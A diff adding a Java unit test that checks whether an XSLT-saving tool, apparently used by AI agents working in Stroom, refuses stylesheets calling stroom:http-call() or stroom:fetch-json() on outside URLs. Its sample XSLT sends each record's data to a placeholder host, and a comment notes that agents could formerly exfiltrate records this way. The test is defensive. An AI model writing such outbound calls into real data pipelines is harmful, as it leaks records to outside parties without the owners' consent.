@@ -150,6 +150,25 @@ class TestSaveXsltTool {
     }
 
     @Test
+    void aStroomFunctionThatReachesOutsideStroomIsSavedOnlyWhereTheXsltReplacedCallsIt() {
+        // Before, an agent's XSLT could call stroom:http-call() and send each record's data to any URL: XsltSafety
+        // refused only the fn: and saxon: functions that read resources.
+        final String calls = HAND.replace("version=\"3.0\">", "version=\"3.0\" xmlns:stroom=\"stroom\">")
+                .replace("{BODY}", "<xsl:value-of select=\"stroom:http-call('https://enrich.example.com', '', "
+                                   + "'text/plain', string(.), '')\"/>");
+        assertThat(refusal(() -> world.docs.checked(world.context(), calls, null, null)).getMessage())
+                .startsWith("XSLT not saved: ")
+                .contains("calls stroom:http-call(), which reaches outside Stroom");
+        // Its production XSLT already calls it (the user put it there): a working copy may keep it, nothing more.
+        world.docs.checked(world.context(), calls, null, calls);
+        assertThat(refusal(() -> world.docs.checked(world.context(), calls.replace("</Event>",
+                "<xsl:value-of select=\"stroom:fetch-json('https://other.example.com', '')\"/></Event>"), null,
+                calls)).getMessage())
+                .contains("stroom:fetch-json()")
+                .doesNotContain("stroom:http-call()");
+    }
+
+    @Test
     void anXsltIsFiledByWhatItWrites() {
         assertThat(XsltSaves.xsltRole("<Events xmlns=\"event-logging:3\"/>")).isEqualTo("Events");
         assertThat(XsltSaves.xsltRole("<xsl:stylesheet xpath-default-namespace=\"event-logging:3\"><records "
